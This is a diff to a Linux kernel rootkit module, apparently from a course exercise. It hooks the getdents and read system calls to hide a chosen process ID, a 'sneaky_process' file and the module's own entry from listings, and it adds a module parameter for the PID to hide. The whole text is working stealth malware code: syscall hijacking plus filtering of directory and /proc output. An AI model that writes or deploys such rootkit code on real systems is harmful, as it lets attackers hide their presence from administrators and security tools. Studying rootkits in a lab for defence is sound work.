@@ -14,8 +14,13 @@ struct linux_dirent {
   u64 d_ino;
   s64 d_off;
   unsigned short d_reclen;
-  char d_name[BUFFLEN];
+  char d_name[];
 };
+
+MODULE_LICENSE("GPL");
+static char * sneaky_pid = "";
+module_param(sneaky_pid, charp, 0);
+MODULE_PARM_DESC(pid, "sneaky_pid");
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -57,13 +62,14 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
   struct linux_dirent *d;
-  int nread = original_getdents(fd, dirp, count);
+  int nread, bpos;
+  nread = original_getdents(fd, dirp, count);
   // if(nread==-1){
   //   handle_error("open");
   // }
   if(nread==0) return 0;
-  int bpos=0;
-  while(bpos<nread){
+  
+  for(bpos = 0;bpos<nread;){
     d = (struct linux_dirent *) ((char*)dirp + bpos);
     if ((strcmp(d->d_name, sneaky_pid) == 0) || (strcmp(d->d_name, "sneaky_process") == 0)) {
       memmove((char*)dirp + bpos, (char*)dirp + bpos + d->d_reclen, nread - bpos - d->d_reclen);
@@ -79,16 +85,18 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
+  
   ssize_t nread = original_read(fd, buf, count);
+  char *start, *end;
   // if (nread == -1) {
   // }
   if (nread == 0) {
     return 0;
   }
 
-  char * start = strstr(buf, "sneaky_mod ");
+  start = strstr(buf, "sneaky_mod ");
   if (start != NULL) {
-    char * end = strchr(start, '\n');
+    end = strchr(start, '\n');
     if(end !=NULL){
       end++;
       memmove(start, end, (char __user*)(buf + nread) - end);
